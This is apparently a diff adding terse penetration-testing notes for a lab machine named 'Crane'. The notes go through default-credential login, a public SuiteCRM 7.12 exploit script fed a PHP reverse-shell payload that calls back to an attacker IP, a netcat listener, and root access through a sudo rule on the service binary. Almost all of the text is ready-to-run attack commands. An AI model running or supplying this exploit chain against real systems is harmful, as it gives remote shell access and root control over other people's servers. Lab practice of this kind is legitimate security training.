@@ -1,0 +1,20 @@
+Crane
+
+
+login with default credential admin:admin
+
+
+suiteCRM 7.12 exploite
+https://github.com/manuelz120/CVE-2022-23940/blob/main/exploit.py
+
+"php -r '\$sock=fsockopen(\"192.168.45.173\", 1234); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+python3 exploit.py -h http://192.168.184.146/index.php -u admin -p admin -P "php -r '\$sock=fsockopen(\"192.168.45.173\", 1234); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+nc -nvlp 1234
+
+sudo -l
+
+(ALL) NOPASSWD: /usr/sbin/service
+sudo service ../../bin/sh
+
